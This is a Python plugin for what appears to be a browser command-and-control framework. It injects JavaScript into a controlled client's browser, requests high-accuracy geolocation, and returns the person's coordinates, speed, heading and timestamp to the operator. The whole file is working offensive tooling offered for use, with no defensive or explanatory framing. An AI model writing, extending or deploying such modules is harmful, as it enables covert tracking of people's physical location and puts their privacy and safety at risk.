from c2.plugins.internal.plugins import BasePlugin, action


class GeolocationPlugin(BasePlugin):
    name = "geolocation"
    icon = "fa-location-dot"

    @action(icon="fa-location-dot")
    async def locate(self) -> dict:
        """Returns the client's current geographic position via the Geolocation API.

        The browser will prompt the user for permission if not already granted.
        Returned dict contains:
        - latitude, longitude (degrees)
        - accuracy (metres)
        - altitude, altitudeAccuracy (metres, or null)
        - heading (degrees from north, or null)
        - speed (m/s, or null)
        - timestamp (Unix ms)

        :return: Position dict
        :rtype: dict
        """
        return await self.methods.eval_js('''
            return new Promise(function(resolve, reject) {
                if (!navigator.geolocation) {
                    reject(new Error("Geolocation is not supported by this browser"));
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    function(pos) {
                        resolve({
                            latitude:         pos.coords.latitude,
                            longitude:        pos.coords.longitude,
                            accuracy:         pos.coords.accuracy,
                            altitude:         pos.coords.altitude,
                            altitudeAccuracy: pos.coords.altitudeAccuracy,
                            heading:          pos.coords.heading,
                            speed:            pos.coords.speed,
                            timestamp:        pos.timestamp
                        });
                    },
                    function(err) {
                        reject(new Error(err.message));
                    },
                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                );
            });
        ''', timeout=20)
